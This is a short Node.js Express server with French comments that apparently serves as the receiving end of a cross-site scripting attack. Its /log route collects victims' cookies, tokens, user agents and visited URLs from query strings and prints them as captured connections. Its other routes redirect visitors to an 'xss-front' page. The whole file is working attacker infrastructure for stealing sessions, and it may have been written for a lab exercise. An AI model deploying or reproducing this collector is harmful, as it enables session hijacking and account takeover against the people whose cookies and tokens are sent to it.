const express = require('express');
const app = express();
const cors = require('cors');

app.use(cors());

app.get('/log', (req, res) => {
  // Extraire les paramètres de la requête
  const cookie = req.query.cookie || null;
  const token = req.query.token || null;
  const userAgent = req.query.userAgent || null;
  const url = req.query.url || null;

  // Log clair des données reçues
  console.log('--- Nouvelle connexion capturée ---');
  if (cookie) console.log('[+] Cookie :', decodeURIComponent(cookie));
  if (token) console.log('[+] Token :', decodeURIComponent(token));
  if (userAgent) console.log('[+] User-Agent :', decodeURIComponent(userAgent));
  if (url) console.log('[+] URL visitée :', decodeURIComponent(url));
  console.log('----------------------------------\n');

  res.send('Données reçues, merci !');
});

app.get('/', (req, res) => {
  res.redirect('https://aket0.github.io/xss-front/xss.html');
});

app.get('/xss', (req, res) => {
  res.redirect('https://aket0.github.io/xss-front/xss.html');
});

app.listen(5000, '0.0.0.0', () => {
  console.log('Serveur de logs démarré sur http://0.0.0.0:5000');
});
